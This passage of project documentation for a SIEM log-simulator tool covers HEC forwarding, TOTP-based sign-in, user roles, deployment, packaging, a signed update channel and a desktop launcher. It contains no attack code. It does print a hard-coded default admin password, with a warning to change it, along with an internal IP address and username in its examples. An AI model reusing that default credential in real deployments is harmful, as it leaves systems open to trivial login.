| `POST /test` | `{ip, port, proto, hec{}}` | `{ok, reachable, warn, ms, code, message}` | Reachability probe (see §11) |
| `GET /status` | — | `{ok, backend, forwarded}` | Health / counter |
| `GET /*` | — | file | Static host for the app |

The backend logs every relay to its console:
`→ forwarded N line(s) to <ip>:<port>/udp (UDP: no delivery confirmation)`.

**UDP is fire-and-forget** — a rising "sent" count means packets left the host,
not that the SIEM received them. Use TCP, HEC, or the Test button to confirm
delivery.

### Splunk HEC

Selecting **HEC** as the protocol swaps the port to **8088** and reveals the HEC
settings row: token, index (blank = the token's default), sourcetype (default
`syslog`), **HTTPS**, and **skip cert** (on by default — Splunk ships a
self-signed HEC certificate).

`hec` payload: `{token, index, sourcetype, ssl, insecure}`. Each queued event
becomes one JSON envelope, and a batch is the envelopes joined by newlines, POSTed
to `/services/collector/event` with `Authorization: Splunk <token>`:

```json
{"time":1756288800.123,"host":"fw-edge-01","source":"jedisyslogger",
 "sourcetype":"syslog","index":"siem",
 "event":"<134>Aug 27 10:00:00 fw-edge-01 kernel: [UFW ALLOW] IN=eth0 SRC=…"}
```

The raw line goes in `event` as a string, so Splunk indexes it verbatim and the
usual syslog field extractions apply. `host` is the generating host from the
event itself; a blank index or sourcetype falls back to the token's defaults.
Splunk answers each batch with `{"text":"Success","code":0}`; anything else is
surfaced verbatim in the forwarding foot (`Invalid token`, `Incorrect index`,
`Server is busy`, …). Any HEC-compatible endpoint works — Splunk Enterprise,
Splunk Cloud, Cribl Stream.

Verify in Splunk with `index=<index> source=jedisyslogger`.

---

## 11. Connectivity test

The **Test** button probes the configured `IP:port` via `POST /test`.

| Protocol | Behaviour |
|----------|-----------|
| **TCP** | Real connect. `✓ reachable and port open`, `✗ Connection refused` (ECONNREFUSED), or `✗ timed out` (firewall). Definitive. |
| **UDP** | Connected-UDP probe. `✗ ICMP port-unreachable` if nothing is listening (Linux). An open/filtered port is inconclusive (`◐`) because UDP has no ack. |
| **HEC** | Posts one real (indexed) probe event, so it also proves the token, the index and the TLS settings. Reports Splunk's own answer, and names the fix for the two common TLS mistakes — HTTPS against a plain-HTTP input, and a rejected self-signed certificate. |

Result colouring: green = reachable, amber = inconclusive (UDP open/filtered),
red = failed (with the exact error code).

---

## 12. Configuration reference

All controls live in the header and the **Source & delivery configuration** bar.

| Control | Effect |
|---------|--------|
| Start / Stop Ingestion | Run/pause baseline generation |
| Rate slider | 0–60 baseline events per second |
| RFC 3164 / RFC 5424 | Wire format for generic sources |
| Reset | Clear all state, counters, stream, and alerts |
| Log collector `IP : port` + `UDP/TCP/HEC` | Forwarding/test destination (IP or hostname) |
| HEC token / index / sourcetype / HTTPS / skip cert | Splunk HEC settings (shown only for **HEC**) |
| **Test** | Probe reachability of that destination |
| **Forward live** | Relay generated logs as real syslog (needs backend) |
| Volume limit — Unlimited / Limit to N | Total-event cap; auto-stops at N |
| File replay — Choose file / loop / use as source | Replay an uploaded log file |
| Stream filter / pause | Filter the live stream; freeze it |

| Signed-in badge / **Sign out** | Who the session belongs to; ends it (see §13) |

Environment variables:

| Variable | Effect |
|----------|--------|
| `PORT` | backend listen port (default **8099**) |
| `JEDI_AUTH=off` | disable the sign-in entirely (see §13) |
| `JEDI_SECURE_COOKIE=1` | add `Secure` to the session cookie, for use behind TLS |

---

## 13. Accounts, sign-in and per-user settings

`server.js` gates the whole app behind a password **and** a TOTP second factor,
across as many accounts as you need. It is on by default: this backend opens real
UDP/TCP sockets and can POST to a Splunk HEC, so an open port here is an open
relay onto your network.

Static hosting (`python3 -m http.server`, `file://`) enforces **nothing** — there
is no process to check a session, no accounts, and no saved settings. Only the
Node backend authenticates or remembers.

### The credential store

`auth.json`, mode `0600`, gitignored,
and never served (`serveStatic` refuses it and any dotfile, including through a
`..` path). Format version 2:

```json
{ "version": 2, "users": [ { … }, { … } ] }
```

Each entry:

| Field | Meaning |
|-------|---------|
| `id` | 16 hex characters; what the `/api/users/<id>` routes address |
| `user` | the sign-in name |
| `role` | `admin` or `user` |
| `salt` / `hash` | scrypt(password, salt, 64) — N=16384, the Node default |
| `totpSecret` | Base32, 160 bits of randomness, per account |
| `totpConfirmed` | false until a code from the enrolled app verifies once |
| `lastTotpStep` | the last accepted 30-second step — the replay guard |
| `passwordIsDefault` | drives the console warning and the ⚠ badge in the header |
| `collector` | that user's Log Collector panel — see below |

A **version 1 file** (one flat user object, before multi-user) is migrated in
place on load: the account is carried over whole and promoted to `admin`, so the
password hash and an already-enrolled TOTP secret survive the upgrade. Nobody is
locked out of their own install by updating.

### Roles

| Role | Can do |
|------|--------|
| `user` | Their own dashboard, their own collector, their own password and second factor |
| `admin` | All of that, plus create, delete, promote, demote, and reset the password or second factor of anyone |

Two guardrails are enforced in `auth.js`, not merely greyed out in the UI: you
cannot delete or demote the account you are signed in as, and the last remaining
admin cannot be deleted or demoted.

### Defaults

| | Value |
|---|---|
| Username | `admin` (role `admin`) |
| Password | `APEXjedi2026!` |
| TOTP secret | random per account — shown as a QR, never a fixed default |

The password is documented, therefore public. `--set-password` before exposing
the port; until then the console warns at every start and the dashboard header
shows a **⚠ default password** badge next to the signed-in user.

### The sign-in flow

```
POST /auth/login  {user, pass}
   ├─ wrong            → 401 {error}                        (counts toward lockout)
   ├─ locked out       → 429 {locked, retryAfter, error}
   ├─ right, enrolled  → 200 {stage:'totp',  pending}
   └─ right, first use → 200 {stage:'enrol', pending, secret, pretty, uri}

POST /auth/totp   {pending, code}
   ├─ bad/replayed/expired → 401 {error}                     (counts toward lockout)
   └─ good                 → 200 {user, expires} + Set-Cookie: jedi_sid=…
```

A correct password on its own grants nothing: it returns a `pending` token good
for three minutes, and only the code exchanges that for a session. The session id
travels **only** in the `HttpOnly` cookie — never in a response body, never in a
URL — so page JavaScript cannot read it.

| Endpoint | Purpose |
|----------|---------|
| `POST /auth/login` | step 1 — username + password |
| `POST /auth/totp` | step 2 — the six-digit code; issues the session cookie |
| `POST /auth/logout` | drop the session and clear the cookie |
| `GET /auth/session` | who is signed in (`{authRequired, user, role, expires, passwordIsDefault}`) |

Reachable without a session: `/login.html`, `/js/login.js`, `/js/qr.js`,
`/css/styles.css` and the four `/auth/*` endpoints. Everything else — the
dashboard, every asset, `/api/*`, `/forward`, `/test`, `/status` — returns a
redirect to the sign-in page for a browser navigation (`Accept: text/html`) or a
JSON **401** for anything else.

### Profile and user-management API

Everything under `/api` needs a session; the `/api/users*` half needs `role:
"admin"`, re-checked server-side on every call.

| Method & path | Body | Purpose |
|---------------|------|---------|
| `GET /api/profile` | — | your account, your saved collector, the account count |
| `PUT /api/profile/collector` | `{collector}` | save your Log Collector panel |
| `POST /api/profile/password` | `{current, next}` | change your own password |
| `POST /api/profile/totp` | `{password}` | new TOTP secret for yourself; returns the QR URI |
| `GET /api/users` | — | **admin** — every account |
| `POST /api/users` | `{user, password, role}` | **admin** — create an account |
| `DELETE /api/users/<id>` | — | **admin** — delete an account and its collector |
| `POST /api/users/<id>/password` | `{password}` | **admin** — set someone's password |
| `POST /api/users/<id>/totp` | — | **admin** — force someone to re-enrol |
| `POST /api/users/<id>/role` | `{role}` | **admin** — promote or demote |

Changing a password (yours or someone else's) revokes that account's sessions —
except the one making its own change, which stays signed in. An admin resetting
someone's second factor is shown nothing secret: that user enrols from the QR
their own next sign-in presents.

The **Account** page (`account.html` + `js/account.js`) is the interface over all
of it, reached from the header once signed in.

### Per-user Log Collector

Each account's `collector` object mirrors the **Log collector (receiver)** panel:

```json
{ "ip": "splunk.lab.local", "port": 8088, "proto": "hec",
  "hec": { "token": "…", "index": "siem", "sourcetype": "syslog",
           "ssl": true, "insecure": true } }
```

`js/ui.js` loads it from `GET /api/profile` right after the session badge
resolves, applies it to the config bar (protocol first, so its port-swap default
cannot overwrite the saved port), and writes it back through
`PUT /api/profile/collector` on every edit, debounced 600 ms. `collectorLoaded`
gates the writer so applying the saved values never saves them straight back.

Values are coerced server-side by `cleanCollector()` — the port clamped to
1–65535, the protocol restricted to `udp`/`tcp`/`hec`, strings length-capped —
because this arrives straight off the wire.

Two people testing different collectors at once never collide, and deleting a
user deletes their collector with them. With `JEDI_AUTH=off` there is no profile,
so nothing is remembered.

### Receiver history

`collectorHistory` on each account is the list of receivers that account has
used, newest first, capped at `HISTORY_MAX` (12). Each entry is a cleaned
collector object plus its bookkeeping:

```json
{ "key": "hec://splunk.lab.local:8088", "id": "9f2c…",
  "ip": "splunk.lab.local", "port": 8088, "proto": "hec", "hec": { … },
  "firstUsed": "2026-08-28T…", "lastUsed": "2026-08-28T…", "uses": 3 }
```

`key` is `protocol://host:port` and is what deduplicates: `rememberCollector()`
updates the matching entry in place — so a re-issued HEC token or a changed index
replaces what was stored — bumps `uses` and `lastUsed`, and moves it to the front.
Only then does the list get trimmed to the cap.

| Method & path | Purpose |
|---------------|---------|
| `GET /api/profile/history` | the list (also returned inside `GET /api/profile`) |
| `POST /api/profile/history` | `{collector}` — record one |
| `DELETE /api/profile/history/<id>` | forget one |
| `DELETE /api/profile/history` | clear the lot |

**When an entry is recorded** is a deliberate choice: on **Test** (whatever the
result — a failing probe is exactly the destination you return to), on switching
**Forward live** on, and on the panel's **Save** button. Never on an edit — the
collector itself is saved on every keystroke, but recording history that way would
fill the list with half-typed addresses.

The dashboard's `📜` row is the interface: a newest-first list, **Use** to load one
back into the panel (protocol first, so its port-swap default cannot overwrite the
stored port), **Save**, and **✕** to forget. The Account page carries the same list
with per-row **Forget** and a **Clear the whole history**.

### TOTP specifics

RFC 6238 over HMAC-SHA1, 6 digits, 30-second step — the universal defaults, so
any authenticator works. Verification accepts the neighbouring steps (±30 s) for
clock drift, and a step that has already been accepted is refused: replaying a
code inside its own window is a copied string, not a second factor.

`node auth.js --selftest` checks the Base32 codec against RFC 4648 §10 and the
generator against the RFC 6238 test vectors, including one past 2³² seconds that
exercises the 64-bit counter.

### Enrolment QR

Nobody should have to retype a 32-character secret, so enrolment is a QR of the
`otpauth://` URI, drawn by `js/qr.js` — a QR encoder written for this project
(byte mode, error-correction level M, versions 1–10, no dependencies). One file
serves both consumers: the sign-in page loads it as a browser script and renders
inline SVG, and `server.js` `require()`s it to draw the same symbol in the
terminal with half-block characters.

Two deliberate choices:

- **The URI omits `algorithm`, `digits` and `period`.** They are the Key Uri
  Format's defaults, and spelling them out pushes the symbol up a version — a
  larger symbol at the same size on screen is a harder one to scan.
- **Both renderers force dark-on-white.** The SVG sits on a white plate rather
  than inheriting the dark theme, and the terminal output sets an explicit white
  background, because a QR inverted by a dark theme is one many scanners refuse.

`node js/qr.js --selftest` checks the format-information strings against ISO/IEC
18004 Table C.1, the version-information strings against Table D.1, and that both
renderers reproduce the module matrix exactly.

The Base32 secret stays available behind **Can't scan it?** on the page and below
the QR in the console, for a password manager or a device with no camera.

### Sessions and lockout

| | |
|---|---|
| Session lifetime | 8 hours, in memory — a backend restart signs everyone out |
| Cookie | `jedi_sid`, `HttpOnly`, `SameSite=Strict`, `Path=/`; `Secure` only with `JEDI_SECURE_COOKIE=1` |
| Lockout | 5 failed attempts → that account is refused for 5 minutes, correct password included |
| Pending token | 3 minutes between the password step and the code step |

The cookie carries `Secure` as soon as the backend is serving HTTPS (§13.1) — it
is omitted over plain HTTP only because such a cookie would never be stored.
Behind a TLS terminator that the backend itself cannot see, force it with
`JEDI_SECURE_COOKIE=1`.

### 13.1 HTTPS

`server.js` serves TLS itself when a certificate and key are present; `https` is a
Node core module, so this adds no dependency and needs no proxy.

| | |
|---|---|
| Certificate | `JEDI_TLS_CERT`, default `certs/server.crt` |
| Key | `JEDI_TLS_KEY`, default `certs/server.key` |
| Neither present | plain HTTP, and the banner says so |
| Redirector | `JEDI_HTTP_REDIRECT_PORT=<n>` — a plain listener that 301s to the HTTPS port |

Both files are read once at startup, so **replacing a certificate needs a
restart**; `certs/` is deliberately outside the pm2 watch list.

Three things follow automatically from TLS being on:

1. `SECURE_COOKIE` flips true, so the session cookie carries `Secure`.
2. The startup banner prints `https://` and names the certificate in use.
3. `certs/` joins `auth.json` in what `serveStatic()` refuses — checked per path
   segment, so an encoded `..` traversal is refused too, for signed-in users as
   much as anonymous ones.

For a host with no DNS name, a self-signed certificate is the practical option:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 825 \
  -keyout certs/server.key -out certs/server.crt \
  -subj "/CN=<ip-or-hostname>" \
  -addext "subjectAltName=IP:<ip>,DNS:localhost,IP:127.0.0.1"
```

Browsers show one interstitial for it — unavoidable for a certificate no CA
signed — and the connection is encrypted regardless. Public CAs do not issue for
bare IP addresses, so a warning-free certificate means giving the host a DNS
name first.

### 13.2 Where the credential store lives

`auth.js` resolves it once, in this order:

1. `$JEDI_AUTH_STORE`, if set.
2. `auth.json` beside the code, **if it already exists** — a checkout, and every
   deployment made before this rule existed, keeps its accounts exactly where
   they are.
3. `auth.json` beside the code, if that directory is writable.
4. Otherwise the per-user data directory:
   `~/.local/share/apex-jedisyslogger/` (Linux, or `$XDG_DATA_HOME`),
   `~/Library/Application Support/apex-jedisyslogger/` (macOS),
   `%LOCALAPPDATA%\apex-jedisyslogger\` (Windows).

Rule 4 exists because the store used to be written next to the code
unconditionally, which is fine for a checkout and fatal for an installed
application: `/usr/share`, `/opt` and `C:\Program Files` are not writable by the
person running the app, so creating the store threw and the backend exited
before it served anything. In the desktop build that looked exactly like the
window closing the instant it opened.

### Command line

```bash
node server.js --list-users                       # every account, role, password and 2FA state
node server.js --add-user <name> '<pw>' [--admin]
node server.js --delete-user <name>
node server.js --set-password [user] '<pw>'       # defaults to the first admin
node server.js --reset-2fa [user]                 # new TOTP secret — lost authenticator
node server.js --reset-auth                       # wipe every account back to the default admin
node server.js --help                             # all of the above
```

Each runs against `auth.json` and exits without starting the listener. A running
backend keeps its accounts and sessions in memory, so **restart it** to apply a
change.

### Turning it off

`JEDI_AUTH=off node server.js` serves with no sign-in at all, for a throwaway
local run. The startup banner says so in plain language, `/auth/session` reports
`authRequired: false`, and the dashboard hides the sign-in badge.

---

## 14. Deployment

The app is a static site plus a zero-dependency Node backend. **Requirement on the
target: Node.js** (no `npm install`).

### Prerequisites

- **Node.js 14 or newer** (any current LTS) — provides the `node` runtime for the
  backend. Verify with `node --version`. Install it from your OS package manager
  or from <https://nodejs.org>.
- **git** — only needed if you clone the repo (you can download an archive
  instead — see below).
- **Nothing else.** There is no `package.json` and no `npm install` — the backend
  uses only Node's built-in `http`, `https`, `dgram`, `net`, `crypto`, `fs`, and
  `path` modules.
- **An authenticator app** on your phone or desktop (Google Authenticator, Aegis,
  1Password, Bitwarden…) — the sign-in needs a TOTP code (§13).

### Getting the code onto a new machine

**Option A — clone with git:**

```bash
git clone https://github.com/alfredonacino/APEX-Jedi-Syslogger.git
cd APEX-Jedi-Syslogger
```

**Option B — download an archive (no git required):**

```bash
# tarball of the main branch
curl -L -o apex.tar.gz \
  "https://github.com/alfredonacino/APEX-Jedi-Syslogger/archive/refs/heads/main.tar.gz"
tar xzf apex.tar.gz
cd APEX-Jedi-Syslogger-main
```

Or from the GitHub web UI: **Code ▾ → Download ZIP**, then
unpack it. Either way you end up with `index.html`, `server.js`, and the `js/`,
`css/`, `samples/` folders — start it with `node server.js` (see below).

### Copy the files to a remote host

If you already have the project locally and want to push it to a server:

```bash
rsync -av --exclude '.git' --exclude 'node_modules' --exclude 'auth.json' \
  ./ alfreddgreat@172.26.250.20:/home/alfreddgreat/APEX_JediSyslogger/
```

> **`auth.json` must never be copied between hosts.** Every install generates its
> own password hash and TOTP secret on first start; shipping one around means two
> machines share a second factor, and a `--delete` sync would wipe the target's
> credentials and silently sign everyone out. Exclude it, always.

### Run it

```bash
cd /home/alfreddgreat/APEX_JediSyslogger
node server.js                                    # foreground, port 8099
PORT=80 node server.js                            # privileged port (needs root/setcap)
setsid node server.js </dev/null >apex.log 2>&1 & # detached
```

Then browse to `http://172.26.250.20:8099` and sign in (§13). On a host's very
first start the console prints the default username and password plus the TOTP
secret to enrol — capture it from `apex.log` when you start it detached.

> **Starting it over SSH: use `setsid`, not `nohup`.** A plain
> `nohup node server.js > apex.log 2>&1 &` leaves the server's stdout attached to
> the SSH session, so the channel never closes and the command appears to hang.
> `setsid` with stdin redirected from `/dev/null` fully detaches it.

### Under pm2

`ecosystem.config.js` holds the process definition. It is not a dependency — pm2
reads it, the app never does, and nothing is installed by its presence.

```bash
cd <project dir>
pm2 start ecosystem.config.js     # watching on, PORT 8099
pm2 save                          # freeze the list for boot
pm2 startup                       # prints one sudo command; run it once
```

| Setting | Why |
|---------|-----|
| `watch` | A **whitelist** of source paths — `server.js`, `auth.js`, `js/`, `css/`, the HTML pages |
| `ignore_watch` | `auth\.json`, `apex\.log`, `.git`, `node_modules`, `samples` |
| `watch_delay` | 1000 ms, so a burst of file writes is one restart |
| `env.PORT` | 8099 |

**Why the whitelist matters:** `auth.json` is rewritten on every sign-in, every
collector edit and every history entry. A watcher that included it would restart
the backend — and, since sessions live in memory, sign everyone out — several
times a minute. It is excluded twice over: it is not in `watch`, and it is in
`ignore_watch`.

The corollary is that credential changes made on disk are **not** picked up by the
watcher. After `--set-password`, `--add-user`, `--reset-2fa` or any other CLI
command, run `pm2 restart <name>`.

`pm2 startup` writes a systemd unit named `pm2-<user>` whose `ExecStart` is
`pm2 resurrect`; at boot it restores whatever `pm2 save` last wrote to
`~/.pm2/dump.pm2`. Check it with `systemctl is-enabled pm2-<user>`. Because the
unit runs as a specific user, generate it for the account that owns the app
(`pm2 startup systemd -u <user> --hp /home/<user>`) and run the printed `sudo`
command from an account that has sudo.

**Updating a running deployment** needs only the `rsync` above — `server.js` serves
the static files from disk on each request, so a change to `js/`, `css/`, or the
docs is live immediately with **no restart and no downtime**. Restart only when
`server.js` itself changes.

### Run as a systemd service (recommended)

`/etc/systemd/system/apex-jedisyslogger.service`:

```ini
[Unit]
Description=APEX JediSyslogger SIEM log simulator
After=network.target

[Service]
Type=simple
User=alfreddgreat
WorkingDirectory=/home/alfreddgreat/APEX_JediSyslogger
Environment=PORT=8099
ExecStart=/usr/bin/node server.js
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now apex-jedisyslogger
sudo systemctl status apex-jedisyslogger
```

### Firewall

Open the dashboard port to your clients, and — if forwarding — allow egress to
the collector:

```bash
sudo ufw allow 8099/tcp             # dashboard
sudo ufw allow out 514/udp          # syslog egress (adjust to your collector)
```

---

## 15. Extending the app

- **New generic log source** — add a builder to `BASELINE` in `js/syslogger.js`
  and a `SOURCE_META` colour/label in `js/ui.js`.
- **New appliance format** — add a formatter to `VENDOR_FORMATTERS` in
  `js/data.js` and a generator to `APPLIANCE` in `js/syslogger.js`, plus a
  `SOURCE_META` entry in `js/ui.js`.
- **New attack scenario** — add an entry to `MORE_ATTACKS` (or `SCENARIOS`, or
  `PRODUCT_ATTACKS` when it is aimed at one product's own log source) in
  `js/syslogger.js`; set `threatSig` or emit content a rule matches.
- **New detection rule** — push a rule object into `makeRules()` in `js/jedi.js`.
  Use `ctx.window()` / `ctx.windowSet()` / `ctx.cooldown()` for correlation.

Four conventions worth keeping:

1. **Declare a non-native `transport`.** If the product can't reach a collector
   without an agent or an API connector, set `transport: 'agent'` / `'api'` on the
   `APPLIANCE` entry. Default is `'native'`. The UI badges anything non-native.
   Silently presenting an API-only product as a syslog appliance teaches a false
   fact about log ingestion, which defeats the point of the tool.
2. **Reuse a rule instead of cloning it.** If a new source carries telemetry an
   existing rule already reads, widen that rule's `srcType` gate. `snare` is
   Windows Event Log over an agent, so it feeds `windows-threat`; `bind` feeds
   `dns-tunneling`; `zeek`'s beacon flows need no gate at all and fall straight
   into `c2-beacon`. A near-duplicate rule means two alerts for one event.
3. **One burst, one alert.** Rules have no global cooldown, so a burst where every
   line carries `threatSig` raises an alert per line. Either tag only the final
   event, or let a stateful rule correlate the burst (`radius-brute`).
4. **Update the counts** in `README.md`, this file, `about.html` and `CLAUDE.md`.
5. **Say how it reaches a collector.** A new `api` or `agent` source needs a
   matching entry in `CONNECTORS.md`, or the tool shows a feed nobody can
   actually stand up.

Every scenario should be wired to at least one rule — the headless harness pattern
(load `js/*` under a stubbed `window`, inject each scenario, assert alerts fire) is
the quickest way to verify coverage. Note that `Jedi.ingest()` wraps each
`rule.run()` in `try/catch` and discards the error, so a **broken rule fails
silently** — a harness that asserts on alerts is the only thing that catches it.

---

## 16. The terminal build

`jedi-cli.js` is the application without a browser. It exists because the two
places you most want this tool — a collector you are commissioning, and a server
with no desktop — are exactly the places a browser dashboard cannot go. It also
removes the backend from the forwarding path: the browser cannot open a socket
and has to `POST /forward` to `server.js` first, whereas the terminal build calls
`forward.js` directly and puts the datagram on the wire itself.

### 16.1 How it stays identical to the web app

It `require()`s `js/data.js`, `js/syslogger.js` and `js/jedi.js` — the same files,
unmodified, that `index.html` loads with `<script>` tags. Nothing is ported,
re-implemented or bundled at runtime. A new scenario or rule appears in both
builds the moment it is added, and a burst that raises one alert in the browser
raises one alert here.

Three small changes made that possible, and they are the reason each file ends the
way it does:

1. **Dual-mode tails.** Each engine module closes over
   `typeof window !== 'undefined' ? window : globalThis` and sets `module.exports`
   when Node is loading it. In a browser both are no-ops.
2. **An additive namespace.** `js/data.js` used to assign `global.JS = {…}`, which
   would have wiped anything `js/version.js` had already put there. It now merges.
3. **An unref'd timer.** The Syslogger's forward-flush interval keeps Node's event
   loop alive forever, which would hang every one-shot CLI run. It is `unref()`ed
   where that method exists — Node only.

`js/ui.js` is *not* required: it is the DOM front end, and the terminal has its own.

### 16.2 Commands and flags

| | |
|---|---|
| `jedi` | live dashboard (the default when stdout is a terminal) |
| `jedi attack <id…>` | inject scenarios, print what fired, exit |
| `jedi appliance <id…>` | one burst from an appliance source, exit |
| `jedi replay <file>` | push a log file through the engine |
| `jedi list scenarios\|appliances\|rules` | what is available |

Flags: `--eps`, `--format`, `--appliance`, `--forward`, `--test`, `--hec-token`,
`--hec-index`, `--hec-sourcetype`, `--hec-plain`, `--hec-verify`, `--duration`,
`--max`, `--every`, `--loop`, `--quiet`, `--raw`, `--json`, `--no-detect`,
`--ascii`, `--no-color`. `jedi --help` is the authoritative list.

Behaviours worth knowing:

- **It degrades on purpose.** No TTY (piped, redirected, under systemd) means the
  dashboard is skipped and the headless path runs instead, so `jedi > out.log`
  never fills a file with escape codes.
- **`attack` waits for quiet, not for a clock.** `injectScenario()` spreads a
  burst 30–90 ms per event and a burst can be twenty events long, so the command
  waits until the stream has been silent for 300 ms. A fixed delay truncated long
  scenarios and their correlation rules never fired.
- **A forwarding failure is loud.** If nothing could be sent, the summary says so
  and the exit status is 1. UDP is the exception and always exits 0 — it is
  fire-and-forget, and the tool must not claim a delivery it cannot observe.
- **The scheme decides TLS.** `hec://` is HTTPS, `hec+http://` is not. The HEC
  config object deliberately carries no `ssl` key so it cannot override the URL.

### 16.3 The dashboard

Rendered with ANSI escapes and nothing else. The alternate screen buffer is
entered on start and left on exit, so your scrollback survives. Keys: `s`
start/stop, `a` attack picker, `x` appliance picker, `+`/`-` rate, `r` reset, `c`
clear detections, `q` quit. Both pickers filter as you type.

Every frame row is built to one measured width. Two rules keep it from tearing:
borders are sized from `vislen()` of the pieces rather than arithmetic on a label
length, and the picker overlay is drawn **opaque** — splicing a coloured row
underneath it by visible width cuts an ANSI escape in half.

### 16.4 One version, everywhere

`js/version.js` is the single source of truth. The dashboard stamps it into the
page header, `server.js` prints it in its banner, the terminal build reports it
in `--version`, and the packaging manifests carry a copy because a `PKGBUILD` is
not JavaScript.

```bash
packaging/version.sh              # print it
packaging/version.sh --check      # every file agrees, or exit 1
packaging/version.sh --set 1.1.0  # stamp app + CLI + all three packages
```

`build.sh` runs `--check` before it packages anything, so a build whose manifest
claims a different version from the code inside it cannot be produced. Releasing
is: `--set`, commit, `git tag -a vX.Y.Z`, `git push --follow-tags`.

### 16.5 Packaging

`packaging/build.sh` produces, from `dist/`:

| Artefact | For |
|---|---|
| `apex-jedisyslogger-<ver>.tar.gz` / `.zip` | any OS with Node 18+ — the whole app, terminal *and* web |
| `apex-jedisyslogger_<ver>_all.deb` (`--deb`) | Debian, Ubuntu, Mint, Raspberry Pi OS |
| `jedi-<ver>.js` | one self-contained file to copy anywhere |
| `jedi-<ver>-<platform>` (`--sea`) | hosts with no Node at all |
| `SHA256SUMS` | all of the above |

Everything is `Architecture: all` / `arch=any`: the application is JavaScript, so
one build serves x86-64 and ARM equally — Apple silicon, a Raspberry Pi and a
Graviton instance take the same file.

`build-deb.sh` deliberately does **not** need `dpkg-dev`. A `.deb` is an `ar`
archive of three members in a fixed order — `debian-binary`, `control.tar.gz`,
`data.tar.gz` — so `ar` and `tar` suffice, and the package can be built from a
machine that is not Debian (this project is developed on CachyOS). `dpkg-deb` is
used instead when it happens to be present, because it also runs its own checks.
The package installs the systemd unit but does **not** start it: this generates
network traffic, and no package should begin doing that on its own.

The single-file build comes from `packaging/bundle.js`, ~50 lines that wrap each
module in a function and resolve the literal relative specifiers through a small
`require` shim, falling through to the real `require` for core modules. It is
hand-rolled for the same reason everything else here is: the project takes no
dependencies, and this particular module graph is six files.

`--sea` uses Node's own single-executable feature. It is opt-in and the only path
in the project that reaches outside it, because Node's SEA needs `postject` to
inject the blob. **Cross-building is not possible**: the binary embeds that
platform's `node`, so each target must be built on that platform or in CI.

Distribution manifests: `PKGBUILD` (Arch, **CachyOS**, Manjaro, EndeavourOS —
they are the same package), `apex-jedisyslogger.spec` (RHEL, Rocky, Alma,
Fedora), `apex-jedisyslogger.rb` (Homebrew, macOS arm64 and x86_64),
`install.ps1` (Windows, per-user, no administrator rights) and
`apex-jedisyslogger.service` (systemd, headless forwarding with `DynamicUser` and
a restricted sandbox). None of them declares a licence, because the repository
does not declare one — add a `LICENSE` file and set the field before publishing
any of these.

A note on `set -e` in `package()`: `makepkg` runs it with errexit, so a trailing
`[ -f LICENSE ] && install …` fails the whole build when the file is absent.
Use an `if` block. That exact line cost a build here.

### 16.6 The update channel

`jedi update` asks `https://atlasupdate.cybercontrol.tech/<channel>.json` whether
a newer version exists. The server is **untrusted**. It can serve any bytes it
likes; what it cannot do is produce an Ed25519 signature over them without the
private key, and every build carries the public half
(`UPDATE_PUBKEY` in `js/version.js` — a public key is meant to ship in every
copy).

The order in `updater.js` is fixed:

```
fetch  →  verify signature  →  parse  →  compare versions
```

Nothing downstream of the check runs on unverified bytes. Details that matter:

- **The signature covers the served bytes exactly.** The manifest is transported
  as `{"manifest": "<json string>", "signature": "<base64>"}` and the signature
  is over that string, not over a re-serialised object. Signing a parsed and
  re-encoded structure would let two different byte strings share one signature.
- **The body is capped at 64 KB while streaming**, not after buffering.
- **HTTPS is required**, except against `localhost` for testing.
- **Redirects are followed at most three times**, and never to a downgraded
  scheme.
- **`jedi update` never installs anything.** It prints the version, the notes,
  the artefact URL and its SHA-256. Upgrading is the package manager's job. An
  updater that can replace its own binary is remote code execution with a
  friendly name.

Exit codes: `0` current, `10` an update is available, `1` the check failed —
including a signature that did not verify, which is a failure and not a "no".

**Publishing.** `packaging/sign.js` builds the manifest and signs it:

```bash
packaging/version.sh --set 1.1.0
./packaging/build.sh --all
node packaging/sign.js --notes "what changed"
# upload dist/publish/ to the web root, <channel>.json at the top level
```

The private key is read from `$JEDI_PUBLISH_KEY`, `$JEDI_PUBLISH_KEY_FILE`, or
`~/.config/apex-jedisyslogger/publish.key`, and the file must not be group- or
world-readable. **It is never accepted on the command line** — argv is visible in
`ps`, in shell history and in CI logs. `sign.js` then derives the public key from
it and aborts unless it matches `UPDATE_PUBKEY`; publishing a manifest signed
with the wrong key would break updates for every installed copy, so that is fatal
at release time rather than discovered in the field. It also verifies its own
signature before writing anything, and refuses to sign artefacts that do not
belong to the current version — a manifest saying 1.1.0 while pointing at the
1.0.0 tarball is worse than no manifest, because clients would verify it, trust
it, and download the wrong thing.

`node packaging/sign.js --generate` produces a fresh keypair, writing the private
half to **stdout only** so it can be redirected straight into a `chmod 600` file
without ever appearing on a terminal.

---

### 16.7 The desktop application

The packages install an application, not a command: a menu entry on Linux, a
Start Menu shortcut on Windows, an `APEX JediSyslogger.app` bundle on macOS.
`desktop.js` is what they all launch.

It does three things:

1. **Starts the backend privately.** `server.js` with `JEDI_DESKTOP=1`, bound to
   `127.0.0.1` on port `0` — the kernel picks the port. Nothing is reachable
   from the network, and nothing collides with an existing install.
2. **Skips the sign-in.** The server mints a 32-byte launch ticket at startup and
   prints the URL containing it to *its own stdout*, which only its launcher
   reads. Presenting it once trades it for an admin session; the ticket is burned
   on first use, valid or not. Loopback binding is enforced — desktop mode
   refuses to start bound to anything else, because the ticket is only defensible
   when nothing off the machine can present it.
3. **Opens a window.** A Chromium-family browser in app mode (`--app=`), with its
   own `--user-data-dir` so it is a separate process to wait on and never touches
   the profile someone browses with. On Linux it passes `--class` so the window
   belongs to the application in the taskbar rather than to the browser.

Closing the window ends the launcher, which kills the backend. There is no
lingering server and no port to remember.

**When it does not open.** Launched from a menu entry there is no terminal to
print to, so every path that can end the launch early also writes
`last-launch.log` into the per-user data directory
(`~/.local/share/apex-jedisyslogger/` on Linux) and raises a zenity/kdialog
dialog. `jedi desktop --debug` runs the same launch with the backend's own log
on the terminal.

**On plain HTTP, deliberately.** Desktop mode ignores `certs/` unless
`JEDI_TLS_FORCE=1`. The socket is loopback, so there is no network path to
protect, and a self-signed certificate would open every launch with a browser
warning — training people to click through the one dialog that should always
stop them.

**What it is not.** It does not bundle a browser engine. Electron or Tauri would
make the window ours, at the cost of ~200 MB per platform, an npm toolchain and a
build per operating system — three things this project does not have and one
(dependencies) it deliberately refuses. Without a Chromium-family browser the
launcher falls back to the default browser, where the app appears as an ordinary
tab, and says so plainly rather than pretending otherwise. `JEDI_BROWSER=/path`
